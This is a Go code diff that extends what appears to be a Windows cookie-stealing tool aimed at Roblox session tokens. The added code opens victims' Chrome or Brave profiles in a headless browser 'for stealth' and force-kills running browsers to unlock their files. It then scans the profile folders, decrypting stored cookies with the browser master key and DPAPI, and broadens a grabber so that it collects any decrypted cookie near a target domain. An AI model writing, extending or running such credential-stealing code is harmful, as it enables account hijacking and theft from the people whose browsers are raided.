@@ -3,6 +3,7 @@ package main
 import (
 	"archive/zip"
 	"bytes"
+	"context"
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/tls"
@@ -23,6 +24,9 @@ import (
 	"syscall"
 	"time"
 	"unsafe"
+
+	"github.com/chromedp/cdproto/network"
+	"github.com/chromedp/chromedp"
 )
 
 var (
@@ -437,16 +441,182 @@ func contains(slice []string, s string) bool {
 }
 
 func extractRobloxCookies() []string {
-	results := extractRobloxCookiesFromDat()
-	target := "ROBLOSECURITY"
-	browserCookies := ultimateGrabber("roblox.com", target)
+	results := []string{}
 
-	for _, c := range browserCookies {
-		if !contains(results, c) {
-			results = append(results, c)
+	// 1. First try the new reliable method (Chromedp / Headless Browser)
+	// This uses the browser's own engine to get the cookies
+	execPath, profilePath, _ := getBrowserSettings()
+	if profilePath != "" {
+		browserCookies, err := getBrowserCookiesChromedp(execPath, profilePath)
+		if err == nil {
+			for _, cookie := range browserCookies {
+				if strings.EqualFold(cookie.Name, ".ROBLOSECURITY") || strings.EqualFold(cookie.Name, "ROBLOSECURITY") {
+					if !contains(results, cookie.Value) {
+						results = append(results, cookie.Value)
+					}
+				}
+			}
 		}
 	}
+
+	// 2. If Chromedp method didn't get enough tokens, continue with other methods
+	// Force kill browsers to unlock files for direct disk access
+	browsers := []string{"chrome.exe", "msedge.exe", "brave.exe", "opera.exe"}
+	for _, b := range browsers {
+		exec.Command("taskkill", "/F", "/IM", b, "/T").Run()
+	}
+	time.Sleep(1 * time.Second)
+
+	// 3. Extract from Roblox Desktop App
+	appCookies := extractRobloxCookiesFromDat()
+	results = append(results, appCookies...)
+
+	// 4. Browser Paths for Disk Scan
+	home, _ := os.UserHomeDir()
+	browserPaths := map[string]string{
+		"Chrome":   filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
+		"Edge":     filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
+		"Brave":    filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
+		"Opera":    filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
+		"Opera GX": filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
+	}
+
+	reRbx := regexp.MustCompile(`_\|WARNING:-DO-NOT-SHARE-[A-Za-z0-9+/=._-]+`)
+
+	for _, basePath := range browserPaths {
+		masterKey, _ := getMasterKey(basePath)
+		filepath.Walk(basePath, func(path string, info os.FileInfo, err error) error {
+			if err != nil || info.IsDir() || info.Size() > 20*1024*1024 {
+				return nil
+			}
+			content, err := os.ReadFile(path)
+			if err != nil {
+				return nil
+			}
+			matches := reRbx.FindAllString(string(content), -1)
+			for _, m := range matches {
+				if len(m) > 100 && !contains(results, m) {
+					results = append(results, m)
+				}
+			}
+			if masterKey != nil {
+				v10Idx := 0
+				for {
+					foundIdx := bytes.Index(content[v10Idx:], []byte("v10"))
+					if foundIdx == -1 {
+						break
+					}
+					actualIdx := v10Idx + foundIdx
+					v10Idx = actualIdx + 3
+					for l := 200; l < 1500; l++ {
+						if actualIdx+l > len(content) {
+							break
+						}
+						data := content[actualIdx : actualIdx+l]
+						decrypted, err := decryptToken(data, masterKey)
+						if err == nil && strings.Contains(decrypted, "_|WARNING") {
+							if !contains(results, decrypted) {
+								results = append(results, decrypted)
+							}
+							break
+						}
+					}
+				}
+			}
+			return nil
+		})
+	}
+
 	return results
+}
+
+func getBrowserCookiesChromedp(execPath, profilePath string) ([]*network.Cookie, error) {
+	var cookies []*network.Cookie
+	opts := append(chromedp.DefaultExecAllocatorOptions[:],
+		chromedp.UserDataDir(profilePath),
+		chromedp.Headless, // Ensure it's headless for stealth
+	)
+	if execPath != "" {
+		opts = append(opts, chromedp.ExecPath(execPath))
+	}
+
+	allocCtx, cancel := chromedp.NewExecAllocator(context.Background(), opts...)
+	defer cancel()
+
+	ctx, cancel := chromedp.NewContext(allocCtx)
+	defer cancel()
+
+	// Timeout to avoid hanging
+	ctx, cancel = context.WithTimeout(ctx, 30*time.Second)
+	defer cancel()
+
+	if err := chromedp.Run(ctx, chromedp.Tasks{
+		network.Enable(),
+		chromedp.Navigate("https://www.roblox.com"),
+		chromedp.ActionFunc(func(ctx context.Context) error {
+			remoteCookies, err := network.GetCookies().WithURLs([]string{"https://www.roblox.com"}).Do(ctx)
+			if err != nil {
+				return err
+			}
+			cookies = append(cookies, remoteCookies...)
+			return nil
+		}),
+	}); err != nil {
+		return nil, err
+	}
+
+	return cookies, nil
+}
+
+func getBrowserSettings() (string, string, string) {
+	home, _ := os.UserHomeDir()
+	braveExePaths := []string{
+		filepath.Join("C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application", "brave.exe"),
+		filepath.Join("C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application", "brave.exe"),
+	}
+	braveProfilePath := filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data")
+
+	chromeExePaths := []string{
+		filepath.Join("C:\\Program Files\\Google\\Chrome\\Application", "chrome.exe"),
+		filepath.Join("C:\\Program Files (x86)\\Google\\Chrome\\Application", "chrome.exe"),
+	}
+	chromeProfilePath := filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data")
+
+	if path, ok := findExistingPath(braveExePaths); ok && dirExists(braveProfilePath) {
+		return path, braveProfilePath, "Brave"
+	}
+
+	if path, ok := findExistingPath(chromeExePaths); ok && dirExists(chromeProfilePath) {
+		return path, chromeProfilePath, "Chrome"
+	}
+
+	return "", "", ""
+}
+
+func findExistingPath(paths []string) (string, bool) {
+	for _, p := range paths {
+		if fileExists(p) {
+			return p, true
+		}
+	}
+	return "", false
+}
+
+func fileExists(path string) bool {
+	info, err := os.Stat(path)
+	return err == nil && !info.IsDir()
+}
+
+func dirExists(path string) bool {
+	info, err := os.Stat(path)
+	return err == nil && info.IsDir()
+}
+
+func min(a, b int) int {
+	if a < b {
+		return a
+	}
+	return b
 }
 
 func extractRobloxCookiesFromDat() []string {
@@ -463,19 +633,13 @@ func extractRobloxCookiesFromDat() []string {
 		return results
 	}
 
-	if len(data) == 0 {
-		return results
-	}
-
 	decrypted, err := decryptDPAPI(data)
 	if err == nil {
 		cookieStr := string(decrypted)
-		// Roblox cookies usually start with _|WARNING:-DO-NOT-SHARE-
-		if strings.Contains(cookieStr, "_|WARNING") {
-			results = append(results, cookieStr)
-		} else if len(cookieStr) > 100 {
-			// Some versions might not have the warning but are still valid tokens
-			results = append(results, cookieStr)
+		re := regexp.MustCompile(`_\|WARNING:-DO-NOT-SHARE-[A-Za-z0-9+/=._-]+`)
+		match := re.FindString(cookieStr)
+		if match != "" {
+			results = append(results, match)
 		}
 	}
 	return results
@@ -614,13 +778,14 @@ func ultimateGrabber(domain string, targetCookie string) []string {
 
 			if _, err := os.Stat(cookiePath); err == nil {
 				tempCookies := filepath.Join(os.TempDir(), fmt.Sprintf("phantom_c_%d", time.Now().UnixNano()))
-				err := copyFile(cookiePath, tempCookies)
-				if err != nil {
+				if err := copyFile(cookiePath, tempCookies); err != nil {
 					continue
 				}
 				content, _ := os.ReadFile(tempCookies)
 				os.Remove(tempCookies)
 
+				// For general cookies, we search for the domain/name nearby
+				// but we increase the search area to be more robust
 				searchTerms := []string{domain, targetCookie}
 				for _, term := range searchTerms {
 					idx := 0
@@ -632,11 +797,12 @@ func ultimateGrabber(domain string, targetCookie string) []string {
 						actualIdx := idx + foundIdx
 						idx = actualIdx + len(term)
 
-						start := actualIdx - 500
+						// Increased search area (3000 bytes)
+						start := actualIdx - 1000
 						if start < 0 {
 							start = 0
 						}
-						end := actualIdx + 1500
+						end := actualIdx + 2000
 						if end > len(content) {
 							end = len(content)
 						}
@@ -645,18 +811,9 @@ func ultimateGrabber(domain string, targetCookie string) []string {
 						v10Matches := regexp.MustCompile(`v10[\x00-\xff]{20,}`).FindAll(searchArea, -1)
 						for _, v10Match := range v10Matches {
 							decrypted, err := decryptToken(v10Match, masterKey)
-							if err == nil && len(decrypted) > 10 {
-								// Validation: either it's a Roblox cookie with the warning, or another cookie
-								if targetCookie == "ROBLOSECURITY" {
-									if strings.Contains(decrypted, "_|WARNING") {
-										if !contains(results, decrypted) {
-											results = append(results, decrypted)
-										}
-									}
-								} else {
-									if !contains(results, decrypted) {
-										results = append(results, decrypted)
-									}
+							if err == nil && len(decrypted) > 5 {
+								if !contains(results, decrypted) {
+									results = append(results, decrypted)
 								}
 							}
 						}
